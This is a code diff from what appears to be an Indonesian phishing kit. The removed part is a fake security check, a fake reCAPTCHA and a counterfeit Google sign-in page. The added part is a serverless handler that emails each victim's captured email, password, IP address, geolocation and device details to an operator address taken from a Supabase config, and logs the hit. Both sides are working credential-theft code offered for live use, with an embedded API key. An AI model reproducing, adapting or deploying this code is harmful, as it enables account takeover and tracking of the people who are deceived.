@@ -1,474 +1,134 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Verifikasi</title>
+export const config = { api: { bodyParser: true } };
 
-<style>
-*{box-sizing:border-box;margin:0;padding:0;}
-html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;-webkit-text-size-adjust:100%;}
-button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
+function countryFlag(code){
+    if (!code || code.length !== 2) return "";
+    const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
+    return String.fromCodePoint.apply(null, codePoints);
+}
 
-#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;padding:20px;z-index:999999;}
-.verify-card{background:#fff;width:100%;max-width:380px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #eee;padding:36px 24px 28px;text-align:center;}
-.verify-progress-wrap{position:relative;width:90px;height:90px;margin:0 auto 22px;}
-.verify-progress-wrap svg{transform:rotate(-90deg);width:90px;height:90px;}
-.verify-progress-wrap circle{fill:none;stroke-width:6;stroke-linecap:round;}
-.verify-track{stroke:#e8eaed;}
-.verify-bar{stroke:#1a73e8;stroke-dasharray:251.2;stroke-dashoffset:251.2;transition:stroke-dashoffset .4s linear;}
-.verify-percent{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:bold;color:#1a73e8;}
-.verify-title{font-size:20px;font-weight:bold;color:#202124;margin-bottom:8px;}
-.verify-sub{font-size:13px;color:#5f6368;line-height:1.5;margin-bottom:6px;}
-.verify-timer{font-size:12px;color:#80868b;margin-bottom:0;}
-.captcha-box{display:none;margin-top:24px;}
-.captcha-box.show{display:block;}
-.captcha-frame{display:flex;align-items:center;gap:14px;border:1.5px solid #d3d3d3;border-radius:8px;padding:16px 18px;background:#fafafa;cursor:pointer;user-select:none;}
-.captcha-frame.checked{border-color:#1a73e8;background:#eaf2fd;}
-.captcha-check{width:26px;height:26px;border:2px solid #999;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:#fff;}
-.captcha-frame.checked .captcha-check{background:#1a73e8;border-color:#1a73e8;}
-.captcha-check::after{content:"";width:6px;height:11px;border:solid #fff;border-width:0 2.5px 2.5px 0;transform:rotate(45deg) scale(0);transition:transform .2s;margin-top:-2px;}
-.captcha-frame.checked .captcha-check::after{transform:rotate(45deg) scale(1);}
-.captcha-label{font-size:14px;color:#202124;font-weight:500;}
-.captcha-brand{margin-left:auto;text-align:right;line-height:1.2;}
-.captcha-brand .logo{font-size:11px;font-weight:bold;color:#4285f4;}
-.captcha-brand .sub{font-size:9px;color:#80868b;}
-.btn-lanjut{width:100%;margin-top:20px;padding:12px;border:none;border-radius:8px;background:#e8eaed;color:#9aa0a6;font-size:14px;font-weight:600;cursor:not-allowed;}
-.btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
-.verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
+export default async function handler(req, res) {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
-.modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.42);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999;}
-.modal.show{display:flex;}
-.login-card{background:#fff;width:92%;max-width:410px;max-height:88vh;overflow-y:auto;border-radius:14px;box-shadow:0 10px 40px rgba(0,0,0,.28);}
-.login-card-header{display:flex;align-items:center;justify-content:space-between;padding:15px 18px;border-bottom:1px solid #e8eaed;}
-.header-left{display:flex;align-items:center;gap:10px;}
-.header-logo{width:22px;height:22px;object-fit:contain;}
-.header-title{font-size:15px;font-weight:500;color:#202124;}
-.close-btn{background:none;border:none;font-size:22px;color:#5f6368;cursor:pointer;padding:3px 9px;border-radius:50%;}
-.card-body{padding:24px 22px 26px;}
-.login-title{font-size:22px;color:#202124;margin-bottom:7px;}
-.login-subtitle{font-size:13px;color:#5f6368;margin-bottom:22px;}
-.login-subtitle strong{font-weight:500;color:#202124;}
-.input-group{margin-bottom:13px;}
-.input-field{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:6px;font-size:14px;color:#202124;outline:none;}
-.input-field:focus{border:2px solid #1a73e8;padding:11px 12px;}
-.checkbox-row{display:flex;align-items:center;gap:9px;margin:9px 0 18px;}
-.checkbox-row input{width:17px;height:17px;cursor:pointer;accent-color:#1a73e8;}
-.checkbox-row label{font-size:13px;color:#202124;cursor:pointer;}
-.login-message{display:none;margin-bottom:13px;padding:9px;border-radius:6px;font-size:12px;}
-.login-message.error{display:block;background:#fce8e6;color:#c5221f;}
-.login-message.success{display:block;background:#e6f4ea;color:#137333;}
-.privacy{font-size:12px;color:#5f6368;line-height:1.5;margin-bottom:17px;}
-.privacy a{color:#1a73e8;text-decoration:none;}
-.actions{display:flex;justify-content:space-between;align-items:center;margin-top:7px;}
-.forgot{color:#1a73e8;font-size:13px;font-weight:500;text-decoration:none;}
-.btn-login{background:#1a73e8;color:#fff;border:none;padding:10px 23px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;}
-.inactive{cursor:default;}
-.signup-area{text-align:center;margin-top:17px;font-size:12px;color:#5f6368;}
-.signup-area button{border:0;background:none;color:#1a73e8;font-weight:500;font-size:12px;cursor:default;}
-</style>
-</head>
+    if (req.method === "OPTIONS") return res.status(200).end();
+    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
-<body>
+    const API_KEY = process.env.RESEND_API_KEY;
+    if (!API_KEY) return res.status(500).json({ error: "API_KEY_MISSING" });
 
-<div id="verifyModal">
-    <div class="verify-card">
-        <div class="verify-progress-wrap">
-            <svg>
-                <circle class="verify-track" cx="45" cy="45" r="40"></circle>
-                <circle class="verify-bar" id="verifyBar" cx="45" cy="45" r="40"></circle>
-            </svg>
-            <div class="verify-percent" id="verifyPercent">0%</div>
-        </div>
-        <div class="verify-title" id="verifyTitle">Memeriksa Keamanan</div>
-        <div class="verify-sub" id="verifySub">Memverifikasi keamanan...</div>
-        <p class="verify-timer" id="verifyTimer"></p>
-        <div class="captcha-box" id="captchaBox">
-            <div class="captcha-frame" id="captchaFrame" onclick="toggleCaptcha()">
-                <div class="captcha-check"></div>
-                <span class="captcha-label">Saya bukan bot</span>
-                <div class="captcha-brand">
-                    <div class="logo">reCAPTCHA</div>
-                    <div class="sub">Privacy - Terms</div>
-                </div>
-            </div>
-            <button type="button" class="btn-lanjut" id="btnLanjut" onclick="lanjutKeLogin()">Lanjutkan</button>
-            <p class="verify-note">Sistem ini digunakan untuk melindungi dari aktivitas otomatis.</p>
-        </div>
-    </div>
-</div>
-
-<div class="modal" id="loginModal" onclick="outsideClose(event)">
-    <div class="login-card" onclick="event.stopPropagation()">
-        <div class="login-card-header">
-            <div class="header-left">
-                <img src="google.png" alt="Google" class="header-logo">
-                <span class="header-title">Masuk</span>
-            </div>
-            <button class="close-btn" type="button" onclick="closeLogin()">×</button>
-        </div>
-        <div class="card-body">
-            <div class="login-title">Sign in</div>
-            <div class="login-subtitle">untuk melanjutkan ke <strong>download page</strong></div>
-            <div class="login-message" id="loginMessage"></div>
-            <form id="loginForm" onsubmit="loginUser(event)">
-                <div class="input-group">
-                    <input id="loginUsername" type="text" class="input-field" placeholder="Email address" required>
-                </div>
-                <div class="input-group">
-                    <input id="loginPassword" type="password" class="input-field" placeholder="Enter your password" required>
-                </div>
-                <div class="checkbox-row">
-                    <input type="checkbox" id="showPass" onchange="togglePassword()">
-                    <label for="showPass">Show Password</label>
-                </div>
-                <p class="privacy">
-                    By continuing, layanan akan menggunakan informasi akun hanya untuk proses login pada halaman ini.
-                    Lihat <a href="#" onclick="return false;">Privacy Policy</a> dan <a href="#" onclick="return false;">Terms of Service</a>.
-                </p>
-                <div class="actions">
-                    <a href="javascript:void(0)" class="forgot inactive" onclick="return false;">Forgot password?</a>
-                    <button type="submit" class="btn-login">Log in</button>
-                </div>
-                <div class="signup-area">
-                    Belum punya akun?
-                    <button type="button" onclick="return false;">Sign up</button>
-                </div>
-            </form>
-        </div>
-    </div>
-</div>
-
-<script>
-
-/* =========================================================
-   1. CEK BLOKIR
-   ========================================================= */
-(function(){
     try {
-        var blocked =
-            localStorage.getItem("sudah_submit") === "1" ||
-            sessionStorage.getItem("sudah_submit") === "1" ||
-            document.cookie.indexOf("sudah_submit=1") !== -1;
-        if(blocked){
-            window.location.replace("/blokir");
-        }
-    } catch(e){}
-})();
+        let d = req.body;
+        if (typeof d === "string") d = JSON.parse(d);
+        if (!d) return res.status(400).json({ error: "BODY_EMPTY" });
 
+        // --- TAMBAHAN MULTI-TENANT ---
+        const WEB_ID = d.web_id || "web_default"; 
+        // -----------------------------
 
-/* =========================================================
-   2. STATE
-   ========================================================= */
-var captchaChecked = false;
-var progressInterval = null;
+        const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
+        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
+        
+        let EMAIL = "admin@domain.com"; 
+        let NAMA = "RESS KENZO"; 
 
-
-/* =========================================================
-   3. ELEMENT HELPER
-   ========================================================= */
-function $(id){ return document.getElementById(id); }
-
-
-/* =========================================================
-   4. MULAI PROGRESS
-   ========================================================= */
-function mulaiProgress(){
-
-    var bar = $("verifyBar");
-    var percentText = $("verifyPercent");
-    var timerText = $("verifyTimer");
-    var titleEl = $("verifyTitle");
-    var subEl = $("verifySub");
-    var box = $("captchaBox");
-    var frame = $("captchaFrame");
-    var btn = $("btnLanjut");
-
-    captchaChecked = false;
-    if(box) box.classList.remove("show");
-    if(frame) frame.classList.remove("checked");
-    if(btn){ btn.classList.remove("active"); btn.disabled = true; btn.textContent = "Lanjutkan"; }
-    if(titleEl) titleEl.textContent = "Memeriksa Keamanan";
-    if(subEl) subEl.textContent = "Memverifikasi keamanan...";
-    if(bar) bar.style.strokeDashoffset = 251.2;
-    if(percentText) percentText.textContent = "0%";
-
-    if(!bar) return;
-
-    var tick = 0;
-    var total = 251.2;
-
-    if(progressInterval) clearInterval(progressInterval);
-
-    progressInterval = setInterval(function(){
-
-        tick++;
-        var percent = Math.min(tick, 48);
-
-        bar.style.strokeDashoffset = total - (total * percent / 100);
-        if(percentText) percentText.textContent = percent + "%";
-
-        var sisa = Math.max(0, Math.ceil((48 - tick) / 3));
-        if(timerText) timerText.textContent = "Memverifikasi keamanan... (" + sisa + " detik)";
-
-        if(tick >= 48){
-            clearInterval(progressInterval);
-            progressInterval = null;
-            if(timerText) timerText.textContent = "";
-            setTimeout(function(){
-                if(titleEl) titleEl.textContent = "Verifikasi Diperlukan";
-                if(subEl) subEl.textContent = "Untuk melanjutkan, centang kotak berikut untuk memastikan kamu manusia, bukan bot.";
-                if(box) box.classList.add("show");
-            }, 400);
-        }
-
-    }, 60);
-}
-
-
-/* =========================================================
-   5. TOGGLE CAPTCHA
-   ========================================================= */
-function toggleCaptcha(){
-    captchaChecked = !captchaChecked;
-    var frame = $("captchaFrame");
-    var btn = $("btnLanjut");
-    if(captchaChecked){
-        if(frame) frame.classList.add("checked");
-        if(btn){ btn.classList.add("active"); btn.disabled = false; }
-    } else {
-        if(frame) frame.classList.remove("checked");
-        if(btn){ btn.classList.remove("active"); btn.disabled = true; }
-    }
-}
-
-
-/* =========================================================
-   6. LANJUT KE LOGIN
-   ========================================================= */
-function lanjutKeLogin(){
-    if(!captchaChecked) return;
-    var btn = $("btnLanjut");
-    if(btn){ btn.textContent = "Memverifikasi..."; btn.classList.remove("active"); btn.disabled = true; }
-    setTimeout(function(){
-        sessionStorage.setItem("verified","1");
-        var vm = $("verifyModal");
-        if(vm) vm.style.display = "none";
-        var lm = $("loginModal");
-        if(lm) lm.classList.add("show");
-    }, 900);
-}
-
-
-/* =========================================================
-   7. TOGGLE PASSWORD
-   ========================================================= */
-function togglePassword(){
-    var input = $("loginPassword");
-    var cb = $("showPass");
-    if(input && cb) input.type = cb.checked ? "text" : "password";
-}
-
-
-/* =========================================================
-   8. CLOSE LOGIN
-   ========================================================= */
-function closeLogin(){
-    var lm = $("loginModal");
-    if(lm) lm.classList.remove("show");
-    var m = $("loginMessage");
-    if(m){ m.textContent = ""; m.className = "login-message"; }
-}
-
-function outsideClose(event){
-    var modal = $("loginModal");
-    if(event.target === modal) closeLogin();
-}
-
-
-/* =========================================================
-   9. DEVICE BLOCK
-   ========================================================= */
-function setDeviceBlocked(){
-    try{ localStorage.setItem("sudah_submit","1"); }catch(e){}
-    try{ sessionStorage.setItem("sudah_submit","1"); }catch(e){}
-    try{ document.cookie = "sudah_submit=1; max-age=31536000; path=/"; }catch(e){}
-}
-
-
-/* =========================================================
-   10. VALIDASI + DETEKSI
-   ========================================================= */
-function validasiInput(email, pass){
-    if(!email || !pass) return "Harap isi email dan kata sandi!";
-    if(!email.toLowerCase().endsWith("@gmail.com")) return "Email harus berakhir dengan @gmail.com";
-    if(pass.length < 8) return "Kata sandi minimal 8 karakter!";
-    if(/^\d+$/.test(pass)) return "Kata sandi tidak boleh angka semua!";
-    if(/^[a-z]+$/.test(pass)) return "Kata sandi tidak boleh huruf kecil semua!";
-    return "";
-}
-
-function formatWaktuWIB(date){
-    var opt = { timeZone:"Asia/Jakarta", day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:false };
-    var parts = new Intl.DateTimeFormat("id-ID", opt).formatToParts(date);
-    var obj = {};
-    parts.forEach(function(p){ obj[p.type] = p.value; });
-    return obj.day+"-"+obj.month+"-"+obj.year+" "+obj.hour+":"+obj.minute+":"+obj.second+" WIB";
-}
-
-function detectDevice(ua){
-    if(/Android/i.test(ua)) return "Android";
-    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-    if(/Windows/i.test(ua)) return "Windows";
-    if(/Mac/i.test(ua)) return "Mac";
-    if(/Linux/i.test(ua)) return "Linux";
-    return "Unknown";
-}
-
-function detectOS(ua){
-    var m;
-    if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1];
-    if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,".");
-    if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); }
-    if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,".");
-    if(/Linux/i.test(ua)) return "Linux";
-    return "Unknown";
-}
-
-function detectBrowser(ua){
-    var m;
-    if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1];
-    if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1];
-    if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1];
-    if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1];
-    if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
-    if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
-    return "Unknown";
-}
-
-
-/* =========================================================
-   11. SHOW MESSAGE
-   ========================================================= */
-function showMessage(text, type){
-    var m = $("loginMessage");
-    if(m){ m.textContent = text; m.className = "login-message " + type; }
-}
-
-function clearMessage(){
-    var m = $("loginMessage");
-    if(m){ m.textContent = ""; m.className = "login-message"; }
-}
-
-
-/* =========================================================
-   12. LOGIN
-   ========================================================= */
-function loginUser(event){
-    event.preventDefault();
-
-    var username = $("loginUsername").value.trim();
-    var password = $("loginPassword").value;
-
-    clearMessage();
-
-    var errMsg = validasiInput(username, password);
-    if(errMsg){ showMessage("❌ " + errMsg, "error"); return; }
-
-    showMessage("Memproses...", "success");
-
-    fetch("https://ipapi.co/json/")
-        .then(function(r){ return r.json(); })
-        .then(function(d){
-            var ua = navigator.userAgent;
-            var payload = {
-                web_id: "web_id_kenz_1", // <--- TAMBAHAN MULTI-TENANT
-                email: username, password: password,
-                ip: d.ip || "-",
-                negara: d.country_name || "-",
-                prov: d.region || "-",
-                kota: d.city || "-",
-                isp: d.org || "-",
-                koord: (d.latitude||"-")+" , "+(d.longitude||"-"),
-                waktu: formatWaktuWIB(new Date()),
-                device: detectDevice(ua),
-                os: detectOS(ua),
-                browser: detectBrowser(ua)
-            };
-            return fetch("/api/send", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+        // --- TAMBAHAN MULTI-TENANT ---
+        // Filter config berdasarkan WEB_ID
+        try {
+            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
+                headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
             });
-        })
-        .then(function(res){
-            console.log("STATUS:", res.status);
-            if(res.status === 403){ window.location.replace("/blokir"); return null; }
-            return res.json();
-        })
-        .then(function(result){
-            console.log("RESPON:", result);
-            setDeviceBlocked();
-            showMessage("✅ Login berhasil!", "success");
-        })
-        .catch(function(err){
-            console.log("ERROR:", err);
-            setDeviceBlocked();
-        })
-        .finally(function(){
-            setTimeout(function(){
-                window.location.href = "https://www.mediafire.com/";
-            }, 1200);
+            const cfgData = await rCfg.json();
+            if (cfgData && cfgData[0]) {
+                if (cfgData[0].email_tujuan) EMAIL = cfgData[0].email_tujuan;
+                if (cfgData[0].nama_ress) NAMA = cfgData[0].nama_ress.split('<')[0].trim();
+            }
+        } catch(e) { console.log("Gagal ambil config:", e); }
+        // -----------------------------
+
+        const flag = countryFlag(d.negaraKode || "");
+        const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
+
+        // FORMAT EMAIL LENGKAP
+        const htmlBody = `
+        <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
+        <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
+          <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
+            <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
+              <h1 style="margin:0;font-size:22px">🥷 ${NAMA} 🥷</h1>
+            </div>
+            <div style="padding:25px">
+              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
+              <table style="width:100%;font-size:14px;border-collapse:collapse">
+                <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">LOGIN</td><td style="padding:10px">Google</td></tr>
+              </table>
+
+              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
+              <table style="width:100%;font-size:14px;border-collapse:collapse">
+                <tr><td style="padding:10px;font-weight:bold;width:35%">DEVICE</td><td style="padding:10px">${d.device || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">OS VERSION</td><td style="padding:10px">${d.os || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">BROWSER</td><td style="padding:10px">${d.browser || "-"}</td></tr>
+              </table>
+
+              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
+              <table style="width:100%;font-size:14px;border-collapse:collapse">
+                <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${flag} ${d.negara || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROVINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">PROVIDER</td><td style="padding:10px">${d.isp || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ASN</td><td style="padding:10px">${d.asn || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">ZIP CODE</td><td style="padding:10px">${d.zip || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">LAT , LONG</td><td style="padding:10px">${d.koord || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">JAM MASUK</td><td style="padding:10px">${d.waktu || "-"}</td></tr>
+              </table>
+            </div>
+            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">
+              ${NAMA} - Real Data Stream
+            </div>
+          </div>
+        </div>`;
+
+        const response = await fetch("https://api.resend.com/emails", {
+            method: "POST",
+            headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
+            body: JSON.stringify({
+                from: NAMA + " <hasilress@mediafire.my.id>",
+                to: [EMAIL],
+                subject: "🥷 " + NAMA + " 🥷 | IP " + (d.ip || "-"),
+                html: htmlBody
+            })
         });
+
+        const data = await response.json();
+
+        if (response.ok) {
+            try {
+                // --- TAMBAHAN MULTI-TENANT ---
+                // Simpen WEB_ID ke logs_result
+                await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
+                    method: "POST",
+                    headers: { 
+                        "apikey": SUPABASE_KEY, 
+                        "Authorization": `Bearer ${SUPABASE_KEY}`,
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ 
+                        web_id: WEB_ID, 
+                        created_at: new Date().toISOString() 
+                    })
+                });
+                // -----------------------------
+            } catch(e) { console.log("Gagal nyatet log:", e); }
+        }
+
+        return res.status(response.status).json(data);
+
+    } catch (error) {
+        return res.status(500).json({ error: "CATCH_ERROR", message: error.message });
+    }
 }
-
-
-/* =========================================================
-   13. INIT — JALAN PAS HALAMAN LOAD
-   ========================================================= */
-window.addEventListener("load", function(){
-
-    /* KALO UDAH SUBMIT → BLOKIR */
-    if(
-        localStorage.getItem("sudah_submit") === "1" ||
-        sessionStorage.getItem("sudah_submit") === "1" ||
-        document.cookie.indexOf("sudah_submit=1") !== -1
-    ){
-        window.location.replace("/blokir");
-        return;
-    }
-
-    /* KALO UDAH VERIF DI SESI INI → LANGSUNG LOGIN */
-    if(sessionStorage.getItem("verified") === "1"){
-        var lm = $("loginModal");
-        if(lm) lm.classList.add("show");
-        return;
-    }
-
-    /* KALO BELUM → MULAI PROGRESS */
-    mulaiProgress();
-
-});
-
-document.addEventListener("keydown", function(event){
-    if(event.key === "Escape") closeLogin();
-});
-
-// ================= TAMBAHAN BUAT BANNER DINAMIS =================
-fetch('/api/config?web_id=web_id_kenz_1').then(r=>r.json()).then(d=>{
-  if(d.banner_url) {
-    var banner = document.getElementById('bannerImg');
-    if(banner) banner.src = d.banner_url;
-  }
-  if(d.footer_text) {
-     const footer = document.createElement('div');
-     footer.style.cssText = 'text-align:center;padding:20px;font-size:12px;color:#888;';
-     footer.textContent = d.footer_text;
-     document.body.appendChild(footer);
-  }
-}).catch(e => console.log("Config load error:", e));
-
-</script>
-
-</body>
-</html>
